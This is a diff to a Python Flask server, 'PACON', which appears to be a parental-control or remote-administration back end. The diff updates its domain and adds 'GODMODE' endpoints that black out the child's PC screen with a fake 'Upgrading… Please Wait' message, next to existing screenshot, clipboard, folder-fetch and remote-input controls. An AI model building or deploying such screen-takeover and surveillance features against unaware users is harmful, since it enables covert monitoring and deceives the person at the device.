@@ -1,29 +1,19 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PACON Service - v1.2.11
+PACON Service - v1.2.12
 =======================
-v1.2.11 changes (vs 1.2.10):
-  - device_screens[device_id] now stores geo_seq / geo_ts and REFUSES to
-    regress: a screenshot or screen-info with a LOWER geo_seq than the
-    currently-stored one will not overwrite the cached geometry. This
-    prevents a stale out-of-order packet from corrupting the dashboard.
-  - /api/control/screen-info/<id> returns geo_seq / geo_ts so the
-    dashboard can sanity-check freshness. It never returns width=0 when
-    a real geometry exists in: (1) memory cache, (2) newest in-memory
-    shot, (3) PIL probe of newest on-disk JPEG for that device.
-  - /api/screenshots returns origin_x / origin_y / geo_seq so that every
-    refresh from the dashboard keeps its geometry in sync with pixels.
-  - _last_known_screen_from_disk is now device-scoped: it only considers
-    files whose filename was last associated with that device in
-    `screenshots[]` OR (if the index has been pruned) whose filename
-    begins with "screenshot_" and whose mtime is recent — never picks
-    another device's shot.
-  - Screenshot retention: 600 s / 2000 entries (unchanged from 1.2.10).
-  - Retained v1.2.10 endpoints:
-      /api/control/swipe-normalized
-      /api/control/scroll-normalized
-      /api/control/click-normalized
+v1.2.12 changes (vs 1.2.11):
+  - Domain updated: https://pacon.onrender.com (was service-ur14.onrender.com).
+    ALLOWED_ORIGINS and get_server_url() both updated.
+  - NEW: /api/control/blackscreen  — queues a 'blackscreen'  command with
+    optional 'message' field for the child agent to display.
+  - NEW: /api/control/unblackscreen — queues an 'unblackscreen' command to
+    tear down the overlay the agent deployed.
+  - Both endpoints are rate-limited (control bucket), require parent auth,
+    and log an activity entry.
+  - All v1.2.11 geometry, monotonic geo_seq, and fingerprint logic retained
+    unchanged.
 """
 import os
 import sys
@@ -124,7 +114,8 @@ app = Flask(__name__)
 app.config['JSON_SORT_KEYS']     = False
 app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024
 ALLOWED_ORIGINS = [
-    'https://service-ur14.onrender.com',
+    'https://pacon.onrender.com',           # primary domain (v1.2.12+)
+    'https://service-ur14.onrender.com',    # legacy — kept for backward compat
     'http://localhost:5001',
     'http://127.0.0.1:5001',
 ]
@@ -401,7 +392,7 @@ def get_server_url():
         render_url = os.environ.get('RENDER_EXTERNAL_URL', '')
         if render_url:
             return render_url.rstrip('/')
-        return 'https://service-ur14.onrender.com'
+        return 'https://pacon.onrender.com'   # updated domain
     return 'http://localhost:5001'
 
 
@@ -411,7 +402,7 @@ def ping_server():
     while ping_running and not _stop_event.is_set():
         try:
             req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'PACON-SelfPing/1.2.11')
+            req.add_header('User-Agent', 'PACON-SelfPing/1.2.12')
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
                     logger.debug("✅ Self-ping OK")
@@ -790,8 +781,6 @@ def _prune_screenshot_index():
 
 
 def _update_device_screen(device_id: str, geo: dict) -> bool:
-    """Atomically update device_screens[device_id] if the incoming geo_seq
-       is newer than what we have. Returns True if accepted."""
     incoming_seq = int(geo.get('geo_seq', 0) or 0)
     incoming_ts  = int(geo.get('geo_ts', 0) or 0)
     prev = device_screens.get(device_id, {})
@@ -817,10 +806,6 @@ def _update_device_screen(device_id: str, geo: dict) -> bool:
 
 
 def _last_known_screen_from_disk(device_id: str) -> Optional[dict]:
-    """Device-scoped PIL fallback: probe only screenshots that we've
-       associated with this device (from the in-memory index) OR — if
-       index was pruned — those whose filename is the newest 'screenshot_'
-       file and whose mtime is within SHOT_RETENTION_SEC."""
     if not device_id:
         return None
     try:
@@ -829,7 +814,6 @@ def _last_known_screen_from_disk(device_id: str) -> Optional[dict]:
         return None
 
     now = time.time()
-    # Pass 1: any indexed shot for this device still on disk.
     try:
         for s in reversed(screenshots):
             if s.get('device_id') != device_id:
@@ -859,7 +843,6 @@ def _last_known_screen_from_disk(device_id: str) -> Optional[dict]:
     except Exception:
         pass
 
-    # Pass 2: index was pruned — scan recent files only.
     candidates = []
     for directory in [UPLOAD_DIR, SCREENSHOT_DIR]:
         for ext in ('*.jpg', '*.jpeg', '*.png'):
@@ -988,7 +971,7 @@ def serve_static(path):
 def get_fallback_html():
     return ('<!DOCTYPE html><html><body style="background:#000;color:#0f0;'
             'font-family:monospace;padding:20px;">'
-            '<h1>🛡️ PACON v1.2.11</h1>'
+            '<h1>🛡️ PACON v1.2.12</h1>'
             '<p>index.html not found in web/public/</p></body></html>')
 
 # ============================================================
@@ -1003,7 +986,7 @@ def health_check():
         "success":          True,
         "service":          "PACON API",
         "status":           "running",
-        "version":          "1.2.11",
+        "version":          "1.2.12",
         "platform":         platform.system(),
         "devices":          len(devices),
         "online_agents":    online_agents,
@@ -2363,17 +2346,54 @@ def control_launch_history():
     return jsonify({'success': True, 'launches': launches[-limit:]})
 
 
+# ============================================================
+# ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ███████╗ ██████╗██████╗ ███████╗███████╗███╗   ██╗
+# GODMODE SCREEN TAKEOVER ENDPOINTS  (NEW in v1.2.12)
+# ============================================================
+
+@app.route('/api/control/blackscreen', methods=['POST'])
+@require_parent_auth
+@rate_limit('control')
+def control_blackscreen():
+    """Deploy a fullscreen black 'Upgrading...' overlay on the child's PC."""
+    d       = request.json or {}
+    device_id = d.get('deviceId', 'unknown')
+    message   = str(d.get('message', 'Upgrading\u2026  Please Wait')).strip()
+    if not message:
+        message = 'Upgrading\u2026  Please Wait'
+
+    payload, code = _enqueue_response(
+        device_id, 'blackscreen',
+        {'message': message},
+        ttl=30.0,
+    )
+    if code == 200:
+        logger.info(f"🖤 Black screen queued for {device_id[:8]}: \"{message}\"")
+        add_activity('blackscreen',
+                     f'Black screen deployed: "{message[:60]}"',
+                     device_id)
+    return jsonify(payload), code
+
+
+@app.route('/api/control/unblackscreen', methods=['POST'])
+@require_parent_auth
+@rate_limit('control')
+def control_unblackscreen():
+    """Remove the black-screen overlay from the child's PC."""
+    d         = request.json or {}
+    device_id = d.get('deviceId', 'unknown')
+    payload, code = _enqueue_response(
+        device_id, 'unblackscreen', {}, ttl=15.0)
+    if code == 200:
+        logger.info(f"☀️ Black screen removal queued for {device_id[:8]}")
+        add_activity('unblackscreen', 'Black screen removed', device_id)
+    return jsonify(payload), code
+
+
+# ---- Screen geometry ----
 @app.route('/api/control/screen-info/<device_id>', methods=['GET'])
 @require_parent_auth
 def control_screen_info(device_id):
-    """
-    Returns the exact, agent-signed geometry for this device. Never
-    returns width=0 if real geometry exists. Priority:
-      1) in-memory device_screens[device_id] (set by agent screenshots
-         and screen-info, monotonic by geo_seq),
-      2) newest in-memory screenshot's width/height for this device,
-      3) PIL probe of the newest on-disk JPEG for this device.
-    """
     info = dict(device_screens.get(device_id, {}))
 
     if not info or not info.get('width'):
@@ -2490,7 +2510,7 @@ def control_fetch_folder():
     return jsonify(payload), code
 
 # ============================================================
-# GODMODE
+# GODMODE (existing)
 # ============================================================
 @app.route('/api/control/clipboard-get', methods=['POST'])
 @require_parent_auth
@@ -2747,8 +2767,9 @@ except Exception:
 # ============================================================
 def main():
     print("=" * 70)
-    print("  PACON SERVICE v1.2.11 — FORCE-EXACT SCREEN GEOMETRY")
+    print("  PACON SERVICE v1.2.12 — GODMODE: BLACK SCREEN TAKEOVER")
     print("=" * 70)
+    print(f"  Domain:           https://pacon.onrender.com")
     print(f"  Web dir:          {WEB_DIR}")
     print(f"  Received dir:     {RECEIVED_DIR}")
     print(f"  Running on Render:{IS_RENDER}")
@@ -2760,8 +2781,9 @@ def main():
     print(f"  Max upload:       {MAX_RECEIVED_FILE_MB}MB per file / 64MB per request")
     print("=" * 70)
 
-    logger.info(f"Web dir: {WEB_DIR}")
-    logger.info(f"Running on Render: {IS_RENDER}")
+    logger.info(f"Domain:     https://pacon.onrender.com")
+    logger.info(f"Web dir:    {WEB_DIR}")
+    logger.info(f"Render:     {IS_RENDER}")
     logger.info(f"Parent PIN: {'SET' if PARENT_PIN else 'NOT SET (unprotected)'}")
     logger.info(f"Agent PIN:  {'SET' if AGENT_PIN else 'NOT SET (unprotected)'}")
     logger.info(f"Telegram:   {'ENABLED' if telegram_config.get('enabled') else 'disabled'}")
